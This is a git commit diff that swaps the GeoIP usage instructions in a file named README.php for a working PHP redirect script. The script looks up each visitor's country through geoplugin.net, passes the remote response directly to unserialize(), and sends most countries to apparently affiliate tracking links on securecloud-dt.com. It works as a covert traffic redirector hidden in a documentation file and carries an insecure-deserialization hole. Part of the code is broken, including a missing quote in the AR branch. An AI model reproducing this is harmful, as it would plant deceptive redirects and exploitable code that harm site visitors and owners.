015c80275d1dcc70e26e2f5a7820ad142308a28f
bagus211 <40594626+bagus211@users.noreply.github.com>
2018-06-26 23:42:32 +0700

    Update README.php

--- README.php
+++ README.php
@@ -1,33 +1,101 @@
-To use from PHP, use something like:
-
-GeoIP Country:
 <?php
-$country_code = apache_note("GEOIP_COUNTRY_CODE");
-$country_name = apache_note("GEOIP_COUNTRY_NAME");
+$a = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR']));
+$countrycode= $a['geoplugin_countryCode'];
+
+if ($countrycode=='AT')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=168757&s1=EKO' ) ;
+else if ($countrycode=='AU')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=129558&s1=EKO' ) ;
+else if ($countrycode=='BE')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=101955&s1=EKO' ) ;
+else if ($countrycode=='CA')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=165170&s1=EKO' ) ;
+else if ($countrycode=='CH')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=162873&s1=EKO' ) ;
+else if ($countrycode=='CZ')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=154826&s1=EKO' ) ;
+else if ($countrycode=='DE')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=172009&s1=EKO' ) ; 
+else if ($countrycode=='DK')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=150402&s1=EKO' ) ; 
+else if ($countrycode=='ES')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=123412&s1=EKO' ) ; 
+else if ($countrycode=='FI')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=152144&s1=EKO' ) ; 
+else if ($countrycode=='FR')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=166715&s1=EKO' ) ; 
+else if ($countrycode=='GB')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=167938&s1=EKO' ) ; 
+else if ($countrycode=='HK')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=141320&s1=EKO' ) ; 
+else if ($countrycode=='HU')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=169800&s1=EKO' ) ; 
+else if ($countrycode=='IE')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=116298&s1=EKO' ) ; 
+else if ($countrycode=='IT')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=175267&s1=EKO' ) ; 
+else if ($countrycode=='JP')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=152560&s1=EKO' ) ; 
+else if ($countrycode=='KR')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=117994&s1=EKO' ) ; 
+else if ($countrycode=='NL')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=168333&s1=EKO' ) ; 
+else if ($countrycode=='NO')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=154873&s1=EKO' ) ; 
+else if ($countrycode=='PL')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=116282&s1=EKO' ) ; 
+else if ($countrycode=='PT')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=164398&s1=EKO' ) ; 
+else if ($countrycode=='RU')
+    header( 'Location: http://cl-npltf.com/?a=64054&c=94892&s1=EKO' ) ; 
+else if ($countrycode=='SE')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=157889&s1=EKO' ) ; 
+else if ($countrycode=='SG')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=121873&s1=EKO' ) ; 
+else if ($countrycode=='TR')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=164633&s1=EKO' ) ; 
+else if ($countrycode=='TW')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=145855&s1=EKO' ) ; 
+else if ($countrycode=='NZ')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=167938&s1=EKO' ) ; 
+else if ($countrycode=='US')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=167980&s1=EKO' ) ; 
+else if ($countrycode=='ZA')
+    header( 'Location: https://securecloud-dt.com/?a=64054&c=166902&s1=EKO' ) ; 
+else if ($countrycode=='AR')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO ) ; 
+else if ($countrycode=='BO')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='CL')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='CO')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='EC')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKOs' ) ; 
+else if ($countrycode=='SV')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='GQ')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='GT')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='HN')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='MX')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='NI')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='PA')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='PY')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='PE')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='UY')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=167642&s1=EKO' ) ; 
+else if ($countrycode=='VE')
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=164633&s1=EKO' ) ; 
+else if ($countrycode=='ID')
+    header( 'Location: http://FACEBOOK.COM' ) ; 
+else
+    header( 'Location: http://securecloud-dt.com/?a=64054&c=118847&s1=EKO' ) ;
 ?>
-
-GeoIP Region:
-<?php
-$country_code = apache_note("GEOIP_COUNTRY_CODE");
-$region = apache_note("GEOIP_REGION");
-?>
-
-GeoIP City:
-<?php
-$country_code = apache_note("GEOIP_COUNTRY_CODE");
-$region = apache_note("GEOIP_REGION");
-$city = apache_note("GEOIP_CITY");
-?>
-
-==================================================
-Redirection with PHP
-
-$country_code = apache_note("GEOIP_COUNTRY_CODE");
-  if ( $country_code == "DE" )
-  {
-  header ("Location: http://www.google.de" );
-  }  
-  else
-  {
-  header ("Location: http://www.yoursite.com" );
-  }
